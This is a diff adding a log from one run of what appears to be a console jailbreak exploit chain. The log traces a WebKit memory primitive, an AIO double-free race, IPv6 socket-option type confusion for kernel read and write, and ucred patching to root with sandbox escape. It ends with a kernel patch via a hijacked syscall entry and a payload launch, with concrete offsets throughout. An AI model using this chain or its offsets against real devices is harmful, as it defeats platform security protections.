@@ -1,0 +1,289 @@
+
+=== run 2026-08-25T20:01:04 ===
+20:02:04	KPATCH-BLOB	632 bytes of patches/1200.bin in hand, head b9 82 00 00 c0 0f 32 48 c1 e2 20 89   10 gateable jump site(s): 0xacd 0x2bd3cd 0x2bd411 0x2bd48d...
+20:02:04	FW	12.02
+OB	bytes=290016 head=e9 36 0e 00 00 f3 0f 1e fa 53 48 83 entry=e9-jmp-rel32
+20:02:04	DRY-RUN-PLAN	budget=400 spray=512
+20:02:04	FW-STATUS	12.02
+20:02:04	ATTEMPT-START	[1] attempt-persisted=true-capture-ms=50-compose-ms=100
+20:02:04	SSV-BUILD	[1] k=2-n=512
+20:02:04	SSV-BUILT	[1] duplicate-index=2
+20:02:04	SSV-STORE-ENTER	[1] writer-ref=0xfffe
+20:02:04	SSV-STORED	[1] fake-host-and-probe-holder-not-serialized
+20:02:04	ADDROF-PREP-BEGIN	[1] slots=12000000-bytes=96000000
+20:02:07	ADDROF-CARRIER-DONE	[1] host-holder-host-holder
+20:02:07	ADDROF-WRAPPER-READY	[1] wait=50ms
+20:02:07	ADDROF-RETURNED	[1] slopkit-core-1
+e-covered=true
+20:02:07	ADDROF-POINTERS	[1] HOST=0x200b04ec0-TARGET=0x200b04f00-HOST2=0x200b04ec0-TARGET2=0x200b04f00
+20:02:07	SSV-GROOM-ENTER	[1] n=512
+20:02:07	FAKE-ADDRESS	[1] host=0x200b04ec0-fake=0x200b04ed0-delta=0x10
+20:02:08	PREDECESSOR-FILLED	[1] qwords=65536-fake=0x200b04ed0
+20:02:08	SSV-PLACEMENT-MISS	[1] TypeError:Unable to deserialize data.
+20:02:08	AUTO-RETRY-SCHEDULED	[1] reason=placement-throw-next-attempt=2
+20:02:08	ATTEMPT-START	[2] attempt-persisted=true-capture-ms=50-compose-ms=100
+20:02:08	SSV-BUILD	[2] k=2-n=512
+20:02:08	SSV-BUILT	[2] duplicate-index=2
+20:02:08	SSV-STORE-ENTER	[2] writer-ref=0xfffe
+20:02:09	SSV-STORED	[2] fake-host-and-probe-holder-not-serialized
+20:02:09	ADDROF-PREP-BEGIN	[2] slots=12000000-bytes=96000000
+20:02:11	ADDROF-CARRIER-DONE	[2] host-holder-host-holder
+20:02:11	ADDROF-WRAPPER-READY	[2] wait=50ms
+20:02:11	ADDROF-RETURNED	[2] slopkit-core-1
+20:02:11	ADDROF-COPY	[2] chars=924176-source-covered=true
+20:02:11	ADDROF-POINTERS	[2] HOST=0x200b04140-TARGET=0x200b04180-HOST2=0x200b04140-TARGET2=0x200b04180
+20:02:11	FAKE-ADDRESS	[2] host=0x200b04140-fake=0x200b04150-delta=0x10
+20:02:11	SSV-GROOM-ENTER	[2] n=512
+20:02:11	PREDECESSOR-FILLED	[2] qwords=65536-fake=0x200b04150
+20:02:11	SSV-RETURNED-CLEARED	[2] length=327681-predecessor-cleared=true
+20:02:11	RW-CARRIER	[2] sid=0xf4a0-vector=0x200bdc300-length=0x100-mode=0x0
+20:02:11	HOLDER	[2] cell=0x200b04180-textarea=0x200e69a08-markerA=0x207c64180-markerB=0x207c641a0
+20:02:11	JSC-PROFILE	[2] u8=0x28-u8flags=0x8-mode=0x0-obj=0x18-objflags=0x0-fn=0x1a-fnflags=0xe-nx=0x8-nxflags=0x0
+0000000
+20:02:11	READ-PRIMITIVE-PASS	[2] arbitrary-read-established-firmware-offsets-asserted=none
+20:02:11	PRIMITIVE-OK	
+20:02:11	BASES	webkit=838e90000 libkernel=82b598000
+20:02:11	PROOF-OK	gadget-table-fits-module  15/15 gated
+20:02:12	PROOF-OK	5-argument-calls-possible-pop-r8
+20:02:12	STUB-TABLE	seeded=35/35 rejected=0
+20:02:12	STUB-SCAN	38/38 in 309 ms
+20:02:12	PROOF-OK	syscall-race-needs-plain-stub  35/35
+20:02:12	STAGE9-STUBS	mmap=stub  jitshm_create=stub  kexec=stub
+20:02:12	PROOF-OK	chain-contexts-round-tripped
+20:02:12	PROOF-OK	main-thread-pivot-lands  203ee74c0 want 203ee74c0
+20:02:12	PID	62
+20:02:12	BUFFERS	reqs1=200e44000 outs=200fcc800 aio_ids=2047ec490
+20:02:12	PROOF-OK	inherited-thread-attributes-read  prio {10,750}  mask c0  (cores 6,7 are available to this process)
+20:02:12	PROOF-OK	walk-found-worker-victim-master  master=2047390a8
+20:02:12	WORKER-READY	wired and armed
+20:02:12	PROOF-OK	worker-calls-kernel-process  worker pid=62 main pid=62
+20:02:12	PROOF-OK	worker-answers-before-arm
+20:02:12	BLOCK-SS	9,10
+20:02:12	BLOCK-AIO	id=0x69  0 ms
+20:02:12	PROOF-OK	blocking-aio-request-accepted
+20:02:12	SPRAY-AIO	512 submits, 512 ids, 50 ms  (0.10 ms per ROP syscall)
+20:02:12	PROOF-OK	spray-submit-returned-id
+20:02:12	SPRAY-CANCELLED	
+20:02:12	PROOF-OK	loopback-server-socket-bound-listening  bind=0 listen=0 fd=11
+20:02:13	PROOF-OK	two-pipe-pairs-created-set  master 12,13   slave 14,15
+20:02:13	PROOF-OK	fcntlf_setfl-o_nonblock-succeeded-four-pipe  returns {0,0,0,0}
+20:02:13	PROOF-OK	third-pipe-exists-carry-ar2_file  leak 16,17
+20:02:13	WIDEN	one 16384 byte write per attempt, peer receive buffer 1024
+20:02:13	PROOF-OK	threads-pinned-core7 at realtime  rtprio main=0 worker=0  affinity main=0 worker=0
+20:02:13	PROOF-OK	worker-tid-read-not-ours  worker=0x18a28 main=0x18a10
+20:02:13	PROOF-OK	worker-answers-after-being-pinned
+20:02:13	PROOF-OK	reclaim-sockets-open  128/128 AF_INET6 sockets, rthdr len 0x78
+20:02:13	ARMED	one core 7, suspend rendezvous, attempts=20
+20:02:13	RACE-PROGRESS	attempt=1 detector_fired=1 real_frees=0 early=0 window=1 late=0 freed_at=0 sprayed_at=0 committed=true
+20:02:13	RACE-PROGRESS	attempt=1 detector_fired=1 real_frees=0 early=0 window=1 late=0 freed_at=0 sprayed_at=0 committed=true
+20:02:13	RACE-PROGRESS	attempt=1 detector_fired=1 real_frees=0 early=0 window=1 late=0 freed_at=0 sprayed_at=0 committed=true
+20:02:14	RACE-PROGRESS	attempt=1 detector_fired=1 real_frees=0 early=0 window=1 late=0 freed_at=0 sprayed_at=0 committed=true
+20:02:14	RACE-DONE	1 attempts in 1038 ms, detector fired 1 time(s): 1 real double free(s), 0 harmless misfire(s)
+20:02:14	PROBE	walked the worker forward 0.0 steps on average, worst 0 of 0, 0 re-suspend failures
+20:02:14	DETECTOR	poll_err+worker_in_delete (tcp_state=report-only)
+20:02:14	STUCK-DATA	1 attempts left 16384 bytes outstanding, 0 writes failed
+20:02:14	RENDEZVOUS	1 suspends: in-window 1 / already finished 0   handoff cost 1.0 yields   dropped: 0 never started, 0 suspend refused
+20:02:14	WINDOW-RATE	in-window at the decision: 1/1
+20:02:14	WIN-EVIDENCE	poll_err=0x10004 tcp_state=4   worker chain at the decision: started=1 finished=0   race_errs=0x0,0x0
+20:02:14	PROOF-OK	race-won  1 detector hits in 1 attempts
+20:02:14	PROOF-OK	deletes-reported-success-a-real  race_errs=0x0,0x0
+20:02:14	PROOF-OK	freed-chunk-reclaimed-rthdr-data  twins are fds 46 and 106 after 1 round(s)
+20:02:14	DOUBLE-FREE-ACHIEVED	fds 46 and 106 now alias one 0x80 allocation
+20:02:14	SCHED-RELEASED	affinity=0 back to c0, rtprio=0 back to {10,750}
+20:02:14	TWIN-CLOSED	fd 106 freed the rthdr; fd 46 still points at it
+20:02:14	EVF-CONFUSED	evf=0x356 after 0 round(s)
+20:02:14	PROOF-OK	evf-type-confused-rthdr
+20:02:14	KADDR-EVF-CV	ffffffffca780798
+20:02:14	KADDR-REQS2	ffffad157bce3500
+20:02:14	PROOF-OK	leaked-evf-holds-kernel-pointers  cv=ffffffffca780798 reqs2=ffffad157bce3500
+20:02:14	PROOF-OK	read-window-widened-0x800  getsockopt returned 2048
+20:02:14	LEAK-FD	every leak request names fd 17 (leak pipe, write end) with nbyte=0
+20:02:14	REQS2-FOUND	entry 9 after 11 round(s)
+20:02:14	PROOF-OK	full-aio_entry-leaked  at +0x480
+20:02:14	KADDR-REQS1	ffffad135f79db00  (raw ffffad135f79db78)
+20:02:14	KADDR-AIO-INFO	ffffad135f7c8dc0
+20:02:15	KADDR-AR2-FILE	ffffad13063f9b38
+20:02:15	LEAK-ENTRY-INDEX	window entry 9
+20:02:15	TARGET-SEARCH	scanning 256 batches, each cancel + 0x800 OOB read
+20:02:15	TARGET-SCAN	batch 0 rthdr_len=2048
+20:02:15	TARGET-SCAN	batch 32 rthdr_len=2048
+20:02:15	TARGET-SCAN	batch 64 rthdr_len=2048
+20:02:15	TARGET-SCAN	batch 96 rthdr_len=2048
+20:02:15	TARGET-SCAN	batch 128 rthdr_len=2048
+20:02:15	TARGET-ID	0x82f4 at batch 140
+20:02:15	PROOF-OK	target_id was identified
+20:02:15	KADDRS	evf_cv=ffffffffca780798 reqs2=ffffad157bce3500 reqs1=ffffad135f79db00 aio_info=ffffad135f7c8dc0 target_id=0x82f4 evf=0x356 dirty_fd=46
+20:02:15	STAGE-2-DONE	reqs1/reqs2/aio_info/target_id in hand
+20:02:15	EVF-DELETED	0x356
+20:02:15	QUEUE-LEAKED	aio queue entry over the rthdr after 0 round(s), len=8 ar2_cmd=0x1
+20:02:15	PROOF-OK	aio-queue-entry-leaked-rthdr
+20:02:15	BATCH-CRAFTED	ar2_info=ffffad135f79db00 ar2_batch=ffffad157bce3528 ar3_state=COMPLETE
+20:02:15	DIRTY-CLOSED	fd 46 released the aio_entry
+20:02:15	BATCH-OVERWRITTEN	req_id=0x672356 dirty_fd=118 after 0 round(s)
+20:02:15	PROOF-OK	crafted-aio-queue-entry-installed
+20:02:15	TARGET-ARMED	req_id=0x672356 target_id=0x82f4
+20:02:15	DELETE-ERRS	0x0,0x0   (6 ms)
+20:02:15	PROOF-OK	target-deletes-reported-success  0x0,0x0
+20:02:15	PROOF-OK	0x100-chunk-reclaimed-pktopts  pktopts twins are fds 89 and 90 after 1 round(s)
+20:02:15	STAGE-3-DONE	pktopts twins fds 89 and 90 alias one 0x100 allocation
+20:02:15	KARW-SPRAY	rthdr len 0xf8, ip6po_pktinfo -> itself at ffffad135f79db10
+20:02:15	PKTOPTS-TWIN-CLOSED	fd 90 freed the pktopts; fd 89 still points at it
+20:02:15	PKTOPTS-OVERWRITTEN	fd 117 now backs fd 89's pktopts, after 0 round(s)
+20:02:15	PROOF-OK	rthdr-sprayed-live-pktopts
+20:02:15	KREAD-EVF-CV	ffffffffca780798 -> 5700766320667665  as text: 'evf cv'
+20:02:15	PROOF-OK	kernel-memory-reads-string-evf  got 'evf cv'
+20:02:15	SIGIO-PIPE	ar2_file ffffad13063f9b38 -> f_data ffffad157bceda18   pipebuf cnt|in=0 out|size=0 buffer=0   looks like a write end (no buffer of its own
+20:02:15	SIGIO-WALK	ioctl(FIOSETOWN)=0  pipe_sigio before=0 after=ffffad135f7c8c40
+20:02:15	PROOF-OK	pipe_sigio-null-became-kernel-pointerexactly when FIOSETOWN was called
+20:02:15	SIGIO-PID	sigio->proc=ffffad13060e0b68  p_pid=62 getpid=62
+20:02:15	PROOF-OK	proc-sigio-names-proc  p_pid matches getpid()
+20:02:15	KREAD-CURPROC	aio_info+8 = ffffad13060e0b68  (kernel pointer)
+20:02:16	PROOF-OK	curproc-routes-agree  sigio ffffad13060e0b68 vs aio_info ffffad13060e0b68
+20:02:16	CURPROC	ffffad13060e0b68 via sigio
+20:02:16	PROOF-OK	curproc-kernel-pointer  ffffad13060e0b68
+20:02:16	KREAD-PID	p_pid=62 getpid=62
+20:02:16	PROOF-OK	pid-read-kernel-matches-getpid  62 vs 62
+20:02:16	KREAD-FDT	p_fd=ffffad13074aec00 fdt_ofiles=ffffad1306ff3000
+20:02:16	PROOF-OK	file-descriptor-table-reachable  ffffad1306ff3000
+20:02:16	OFILES-CROSSCHECK	ofiles[17] = ffffad13063f9b38   ar2_file said ffffad13063f9b38
+20:02:16	PROOF-OK	ofiles-table-contains-struct-filestage 2 leaked
+20:02:16	PIPE-FILE	master fd 12 file=ffffad130617c750 f_data=ffffad157bcedd50
+20:02:16	PIPE-FILE	slave  fd 14 file=ffffad13063fa2f0 f_data=ffffad157bcedb38
+20:02:16	PROOF-OK	pipes-struct-pipe-addresses-read
+20:02:16	PIPEBUF	master pipebuf now: 0 400000000000 ffffff8064e60000
+20:02:16	KREAD-STATS	21 kread8 calls, 0 failed
+20:02:16	KWRITE-TARGET	ffffad135f79db08 currently holds 0
+20:02:16	KWRITE-AIM	ip6po_pktinfo -> ffffad135f79db08 (setsockopt=0); reading back through it gives 0, target held 0
+20:02:16	PROOF-OK	write-pointer-landed-where-aimed
+20:02:16	KWRITE	wrote 0xfeedc0de4b571337 at ffffad135f79db08 (setsockopt=0), kread8 returns feedc0de4b571337
+20:02:16	PROOF-OK	arbitrary-kernel-address-took-20
+20:02:16	PROOF-OK	read-primitive-survives-write  'evf cv' after 2 pktinfo writes
+20:02:16	PROOF-OK	ip6po_pktinfo-not-left-interior  a dangling interior pointer here is a free() of a non-allocation at teardown
+20:02:16	KERNEL-RW	read=ok write=ok via=pktopts aim=verified selfref=restored
+20:02:16	KSTR-PLAN	residue=0x798 window=0x780000..0x800000 step=0x4000 order=ascending
+20:02:16	KSTR-RESIDUE-ODD	expected 0x26f from the earlier runs but this one gives 0x798
+20:02:16	KSTR-SCAN	2 candidate(s) tested, last read 9010102464c457f
+20:02:16	KERNEL-BASE	ffffffffc9ffc000   e_type=2 e_machine=0x3e ei_class=2
+20:02:16	PROOF-OK	elf-header-base-checks  want e_type 2 or 3, e_machine 0x3e, ei_class 2
+20:02:17	OFF-KSTR	0x784798
+20:02:17	OFF-KSTR-COMPARE	known: 6.00 0x7da91c, 7.xx 0x7f92cb, 8.xx 0x79a92e, 9.xx 0x7edcff, PSFree 0x7f6f27
+20:02:17	PROOF-OK	off_kstr for 12.02 recovered  0x784798   matches the table
+20:02:17	SLOW-READ-BENCH	32/32 eight-byte reads via setsockopt+getsockopt in 7 ms = 36571 bytes/s
+20:02:17	PIPE-PREFLIGHT	write=24 read=24  bytes identical=true  pipebuf mid cnt|in=1800000018  end cnt|in=0  end out|size=400000000000
+20:02:17	PROOF-OK	0x18-write-read-round-trips-masterand leaves cnt/in/out at zero
+20:02:17	FASTRW-AIM	ip6po_pktinfo -> ffffad157bcedd58; through it reads 400000000000, kread8 said 400000000000
+20:02:17	PROOF-OK	pipebuf-aim-confirmed-before-writing
+20:02:17	FASTRW-WRITE	master pipebuf <- out=0 size=0x4000 buffer=ffffad157bcedb38 (setsockopt=0)
+20:02:17	FASTRW-READBACK	pipebuf out=0 size=0x4000 buffer=ffffad157bcedb38   want buffer=ffffad157bcedb38
+20:02:17	PROOF-OK	master-pipe-buffer-points-slave
+20:02:17	PIPES-PINNED	master 12,13 and slave 14,15 taken off the cleanup list
+20:02:17	KERNELVIEW	built on master 12,13 / slave 14,15, pipebuf scratch at 204b1eee0, 8-byte view at 204a08c10
+20:02:17	KV-READ	ffffffffca780798 -> 5700766320667665  as text: 'evf cv'
+20:02:17	PROOF-OK	kernelview-reads-kernel-memory-evf  got 'evf cv'
+20:02:17	KV-FGET	master fp ffffad130617c750 (kread8 said ffffad130617c750), f_data ffffad157bcedd50 (kread8 said ffffad157bcedd50)
+20:02:17	KV-FGET	slave  fp ffffad13063fa2f0 (kread8 said ffffad13063fa2f0), f_data ffffad157bcedb38 (kread8 said ffffad157bcedb38)
+20:02:17	PROOF-OK	pipes-ofiles-entries-matchsocket option read  two independent primitives, same four kernel pointers
+20:02:17	KV-PIPEBUF	master cnt=0 in=0 out=0 size=0x4000 buffer=ffffad157bcedb38
+20:02:17	PROOF-OK	master-pipebuf-aimed-slavestruct pipe  want size=0x4000 buffer=ffffad157bcedb38
+20:02:17	PROOF-OK	master-pipe-drained-between-flushes  cnt=0 in=0 out=0
+20:02:17	KV-BULK	256/256 bytes from ffffffffc9ffc000 in ONE read(2): 7f 45 4c 46 02 01 01 09 00 00 00 00 00 00 00 00
+20:02:18	KV-ELF	magic=0x464c457f ei_class=2 e_type=2 e_machine=0x3e e_entry=ffffffffca066410
+20:02:18	PROOF-OK	read2-pulled-whole-kernel-elfheader out of kernel memory  read 256 bytes, magic 0x464c457f
+20:02:18	KV-TCLASS	socket says 0x5e1337, kv says 0x5e1337 at ffffad135f79dbb0
+20:02:18	PROOF-OK	kv-getsockoptipv6_tclass-readsame kernel word
+20:02:18	KV-WRITE	wrote 0x4b565701 at ffffad135f79dbb0; socket now says 0x4b565701, kv says 0x4b565701
+20:02:18	PROOF-OK	kernel-word-written-through-pipesread back by the KERNEL, not by us  getsockopt(IPV6_TCLASS) returned 0x4b565701
+20:02:18	PROOF-OK	kv-reads-write  0x4b565701
+20:02:18	PROOF-OK	witness-field-restored  0x5e1337 want 0x5e1337
+20:02:18	KV-RW64	wrote c0de4e014b565701 at ffffad135f79db08, read c0de4e014b565701
+20:02:18	PROOF-OK	8-byte-kernel-round-trip-through  c0de4e014b565701
+20:02:18	KV-BENCH	32 eight-byte reads in 9 ms = 28444 bytes/s   (socket options managed 36571 bytes/s)
+20:02:18	KV-BENCH-BULK	32768 bytes in 1 ms = 32768000 bytes/s in 0x1000-byte reads
+20:02:18	KV-STATS	58 flushes, 33360 bytes read, 24 bytes written
+20:02:18	KERNELVIEW-LIVE	kv is the primitive now
+20:02:18	REPAIR-WALK	fd 89 in6p_outputopts=ffffad135f79db00   want ffffad135f79db00
+20:02:18	REPAIR-WALK	fd 117 ip6po_rthdr=ffffad135f79db00   want ffffad135f79db00
+20:02:18	REPAIR-WALK	fd 118 ip6po_rthdr=ffffad157bce3500   want ffffad157bce3500
+20:02:18	REPAIR-WALK	fd 89 ip6po_pktinfo=ffffad157bcedd58   want ffffad157bcedd58 (master's pipebuf.out)
+20:02:18	PROOF-OK	socket-walk-lands-chunk-stageleaked, from both owners  in6p_outputopts and the twin's ip6po_rthdr are the same allocation, and it is the one...
+20:02:18	PROOF-OK	0x80-chunk-second-owner-wheresaid it is
+20:02:19	PROOF-OK	ip6po_pktinfo-points-master-pipebuf
+20:02:19	REPAIR-AUDIT	256 bytes of the aliased pktopts read back; head 00 1e 00 0f 00 00 00 00 00 00 00 00 00 00 00 00   tclass=0x5e1337   non-zero elsewhere: non...
+20:02:19	PROOF-OK	nothing-ip6_clearpktopts-will-freechunk is a pointer  every word zero except the rthdr header, ip6po_pktinfo and ip6po_tclass
+20:02:19	PIPE-REFCNT	12:1->2  13:1->2  14:2->4  15:1->2
+20:02:19	PROOF-OK	four-pipe-files-holdreference  4/4
+20:02:19	PROOF-OK	f_count-read-1-master-fdswhat one fd and no other holder gives  so 0x28 is f_count
+20:02:19	REPAIR-WRITE	ip6po_pktinfo=0 ip6po_m=0 twin rthdr=0 0x80 rthdr=0
+20:02:19	PROOF-OK	second-owner-reads-nullpointer  chunk X is freed once, by fd 89; chunk Y is freed by nobody and leaks 0x80 bytes
+20:02:19	PROOF-OK	aliased-pktopts-entirely-zeroexcept its tclass  0 non-zero word(s) left
+20:02:19	REPAIR-DONE	every doubly-owned allocation now has exactly one owner
+20:02:19	ALLPROC	ffffffffcbb24538   after 4 le_prev step(s) back from ffffad13060e0b68   = kernel_base + 0x1b28538
+20:02:19	PROOF-OK	allproc-reached-by-walking-p_listbackwards  it is a kernel image address
+20:02:19	PFIND	pid 62 -> ffffad13060e0b68   pid 0 -> ffffffffcbb26308   first pids on the list: 65,64,63,62,65,64,63,62
+20:02:19	PROOF-OK	pfind-found-procone the sigio named  ffffad13060e0b68 vs ffffad13060e0b68
+20:02:19	PROOF-OK	pfind-found-kernel-proc-pid  ffffffffcbb26308
+20:02:19	PRE-JAILBREAK	getuid=1  setuid(0)=-1  getuid=1
+20:02:19	PROOF-OK	process-unprivileged-beforethe patch  uid 1, setuid(0) refused
+20:02:20	SANDBOX-BEFORE	/=90  /system=-1  /mini-syscore.elf=-1  /system_ex=-1
+20:02:20	JAILBREAK-SOURCES	p_ucred=ffffad1307519400 kp_ucred=ffffad130422fa00 prison0=ffffffffcba580c0 p_fd=ffffad13074aec00 root_vnode=ffffad1306010000
+20:02:20	PROOF-OK	structure-jailbreak-writesthrough is a kernel pointer
+20:02:20	JAILBREAK-WRITE	cr_uid=0 cr_prison=ffffffffcba580c0 cr_sceAuthId=4800000000000007 cr_sceCaps[0]=ffffffffffffffff cr_sceAttr[0]=0x80 fd_rdir=ffffad1306010000
+20:02:20	PROOF-OK	ucred-reads-patched
+20:02:20	POST-JAILBREAK	getuid=0 geteuid=0 setuid(0)=0
+20:02:20	PROOF-OK	kernel-reports-root  getuid() went 1 -> 0 and setuid(0) went -1 -> 0
+20:02:20	SANDBOX-AFTER	/=90  /system=90  /mini-syscore.elf=90  /system_ex=90
+20:02:20	PROOF-OK	path-unreachable-beforeopens now  fd_rdir/fd_jdir now point at the kernel's root vnode
+20:02:20	KOFF	sysent[661]=0x110a760 jmp[rsi]=0x47b31   source=offsets table
+20:02:20	KPATCH-GADGET	ffffffffca043b31 reads ff 26 00 eb 11 48 89 df   want ff 26 (jmp qword [rsi])
+20:02:20	PROOF-OK	sysent-replacement-sy_calljmp qword [rsi]
+20:02:20	KPATCH-SYSENT	ffffffffcb106760  sy_narg=4 sy_call=ffffffffca11b650 sy_thrcnt=1
+20:02:20	PROOF-OK	sysent661-sysent-entry  sy_call points into the kernel image and sy_narg is a plausible argument count
+20:02:20	KPATCH-SITES	0xacd:76 0x2bd3cd:76 0x2bd411:76 0x2bd48d:76 0x2bd4d1:76 0x2bd67d:76 0x2bdb2d:76 0x2bdbfd:76 0x4c2:72 0x3914e6:74   (* = already 0xeb)
+20:02:20	PROOF-OK	site-blob-makes-unconditionalcurrently holds a conditional jump
+20:02:21	KPATCH-MAP	jitshm_create(0, 0x4000, rwx) = 90   mmap(920100000) = 920100000
+20:02:21	PROOF-OK	632-bytes-rwx-memory-addressthe reference uses
+20:02:21	KPATCH-COPY	632 bytes written to 920100000, first qword reads 48320fc0000082b9
+20:02:21	PROOF-OK	blob-rwx-memory-bytebyte
+20:02:21	SYSENT-ARMED	sy_call -> ffffffffca043b31  confirmed
+20:02:21	KEXEC	syscall(661, 920100000) = 0   sysent restored=true
+20:02:21	PROOF-OK	sysent661-putas it was
+20:02:21	PROOF-OK	blob-ran-ring-0returned 0  kexec returned 0
+20:02:21	KPATCH-VERIFY	0xacd:eb 0x2bd3cd:eb 0x2bd411:eb 0x2bd48d:eb 0x2bd4d1:eb 0x2bd67d:eb 0x2bdb2d:eb 0x2bdbfd:eb 0x4c2:eb 0x3914e6:eb
+20:02:21	PROOF-OK	gated-site-reads-0xebread back out of live kernel memory  the kernel's own text changed under us
+20:02:21	KERNEL-PATCHED	patches/1200.bin applied and verified (main.js:106-116).
+20:02:21	PATCH-SETTLE	ms=2000
+20:02:23	PAYLOAD-MAP	mmap(0, 0x48000, rwx, PRIVATE|ANON) = 200d2c000
+20:02:23	PROOF-OK	the payload has 290016 bytes of anonymous RWX to live in
+20:02:26	PAYLOAD-COPY	290016 bytes to 200d2c000 in 1307 ms, verified in 1291 ms
+20:02:26	PROOF-OK	byte-payload-rwxmemory  read back through the same primitive that wrote it
+20:02:26	PTHREAD-BYTES	838e92068 (webkit+0x2068) reads ff 25 e2 ba cb 03 cc cc cc cc cc cc cc cc cc cc
+20:02:26	PTHREAD-BYTES-ALT	82b59a068 (libkernel+0x2068) reads 45 f0 48 c7 45 e8 04 00 00 00 e8 f9 90 00 00 48
+20:02:26	PTHREAD-THUNK	jmp qword [rip+63683298]  GOT 83cb4db50 -> 82b5a72b0  (libkernel+0xf2b0)
+20:02:26	PTHREAD-TABLE	GOT slot 83cb4db80 -> 82b5bce00   libkernel+0x24e00 = 82b5bce00   AGREE
+20:02:26	PROOF-OK	pthread_create was identified  offsets table, GOT slot cross-checked against libkernel's own RVA
+20:02:27	PTHREAD-CREATE	pthread_create(&t, 0, 200d2c000, 0) = 0   handle=880f431e0   id=18a2c
+20:02:27	PROOF-OK	payload-thread-created  pthread_create returned 0 and wrote back a thread handle
+20:02:27	PAYLOAD-RUNNING	bytes=290016 entry=200d2c000
+20:02:27	PAYLOAD-SETTLE	ms=2000
+20:02:29	PAYLOAD-ALIVE	getpid=62 after=2000ms
+20:02:29	STAGE-5-DONE	karw=pktopts-fd89 kv=up
+20:02:29	PROOF-OK	stage 2 completed
+20:02:29	PROOF-SUMMARY	pass=89 fail=0
+20:02:29	VERDICT	karw=1 root=1 sandbox=escaped kpatch=1 payload=1 reboot=0
+20:02:29	JAILBROKEN	uid=0 cr_sceAuthId=SYSCORE cr_sceCaps=-1 fd_rdir=rootvnode fd_jdir=rootvnode
+20:02:29	FDS-CLOSED	5/5 block/loopback fds   pipes 12,13,14,15 deliberately left open, +1 reference each
+20:02:29	AIO-CLEANED	513 sprayed ids deleted exactly once
+20:02:29	IPV6-SOCKS-CLOSED	127/127 reclaim sockets; each still owned its own rthdr
+20:02:30	PKTOPTS-TWINS-CLOSED	89:0  117:0
+20:02:30	RTHDR-TWINS-CLOSED	118:0   (rthdr nulled
+20:02:30	POST-CLEANUP-READ	kv reads 5700766320667665 as 'evf cv' after every socket is closed
+20:02:30	PROOF-OK	kernel-r-w-primitive-survives  got 'evf cv'
+20:02:32	SOAK	10/10 checks over 2 s: getpid and an 8-byte kernel read both still work
+20:02:32	PROOF-OK	console-standing-2-s-after  10/10
+20:02:32	THREAD-ATTRS-RESTORED	affinity set=0 reads c0   rtprio set=0 reads {10,750}   wanted c0 {10,750}  ok
+20:02:32	WORKER-DISARMED	restored=true expm1(1)=1.718281828459045
+20:02:32	WORKER-UNWIRED	master.m_vector restored
+20:02:32	EXPM1-RESTORED	m_function=83b415090 ok  expm1(1)=1.718281828459045 ok
+20:02:32	PROOF-SUMMARY-FINAL	pass=91 fail=0 (incl
+20:02:32	SAFE-TO-EXIT	chunkX=freed-once-by-fd89 chunkY=leaked-0x80 pipes=+1ref-each leaks=2-pipe-pairs+0x80
+20:02:32	STEP-4Q-DONE	chain=complete leftovers=none
